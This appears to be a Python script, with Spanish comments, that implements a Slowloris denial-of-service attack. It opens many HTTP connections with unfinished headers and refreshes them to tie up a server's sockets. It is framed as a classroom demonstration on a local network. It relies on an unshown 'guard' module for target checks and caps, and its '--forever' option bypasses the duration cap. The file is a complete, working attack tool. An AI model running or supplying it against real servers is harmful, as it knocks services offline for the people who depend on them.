"""Slowloris: conexiones abiertas que nunca terminan la peticion.

Con `--forever` mantiene las conexiones indefinidamente, refrescando cabeceras
cada pocos segundos, hasta Ctrl+C. Sirve para mostrar en clase como un servidor
sin timeout de lectura acumula sockets con un ancho de banda minimo.
"""

import argparse
import json
import socket
import time

from guard import (
    MAX_DURATION,
    MAX_SOCKETS,
    GuardError,
    clamp,
    parse_target,
    resolve,
)


def open_partial(ip: str, port: int, host: str) -> socket.socket:
    """Abre una conexion y deja la peticion a medias (sin linea en blanco)."""
    sock = socket.create_connection((ip, port), timeout=3)
    sock.sendall(f"GET / HTTP/1.1\r\nHost: {host}\r\n".encode())
    sock.sendall(b"X-Padding: " + b"a" * 16 + b"\r\n")
    return sock


def main() -> None:
    parser = argparse.ArgumentParser(
        description="Slowloris acotado (laboratorio de red local)"
    )
    parser.add_argument("--dns", required=True, help="nombre DNS o IP del destino")
    parser.add_argument("--port", type=int, required=True, help="puerto del destino")
    parser.add_argument("--sockets", type=int, default=200, help="conexiones parciales")
    parser.add_argument("--duration", type=float, default=30.0, help="segundos")
    parser.add_argument("--forever", action="store_true", help="no termina hasta Ctrl+C")
    parser.add_argument("--keepalive", type=float, default=5.0, help="segundos entre refrescos")
    args = parser.parse_args()

    try:
        host, port = parse_target(args.dns, args.port)
        ip = str(resolve(host, port))
    except GuardError as exc:
        print(f"[abortado] {exc}")
        raise SystemExit(2)

    sockets_wanted = int(clamp("sockets", args.sockets, MAX_SOCKETS))
    if not args.forever:
        args.duration = clamp("duration", args.duration, MAX_DURATION)

    print("=" * 66)
    print(f"  DESTINO   : {host}:{port}  ->  {ip}")
    print(f"  PATRON    : {sockets_wanted} sockets con cabeceras incompletas")
    print(f"  MODO      : {'INFINITO (Ctrl+C para parar)' if args.forever else f'{args.duration:g}s'}")
    print("=" * 66, flush=True)

    sockets: list[socket.socket] = []
    failures = 0
    for index in range(sockets_wanted):
        try:
            sockets.append(open_partial(ip, port, host))
        except OSError:
            failures += 1
            if not sockets:
                print("  el destino no acepta conexiones")
                raise SystemExit(1)
        if index and index % 50 == 0:
            print(f"  {len(sockets)} conexiones parciales abiertas", flush=True)

    opened = len(sockets)
    print(f"  abiertas {opened} conexiones · fallidas {failures}", flush=True)

    deadline = None if args.forever else time.perf_counter() + args.duration
    closed_by_peer = 0
    try:
        while sockets and (deadline is None or time.perf_counter() < deadline):
            alive: list[socket.socket] = []
            for sock in sockets:
                try:
                    sock.sendall(b"X-Keepalive: 1\r\n")
                    alive.append(sock)
                except OSError:
                    sock.close()
            gone = len(sockets) - len(alive)
            if gone:
                closed_by_peer += gone
                print(f"  el destino cerro {gone} conexiones", flush=True)
            sockets = alive
            time.sleep(args.keepalive)
    except KeyboardInterrupt:
        print("\n  detenido por el usuario")
    finally:
        for sock in sockets:
            try:
                sock.close()
            except OSError:
                pass
        print(f"  resumen: {opened} abiertas · {closed_by_peer} cerradas por el destino", flush=True)
        print(
            "RESULT:"
            + json.dumps(
                {
                    "kind": "slowloris",
                    "opened": opened,
                    "closed_by_peer": closed_by_peer,
                    "connect_failures": failures,
                },
                sort_keys=True,
            ),
            flush=True,
        )


if __name__ == "__main__":
    main()
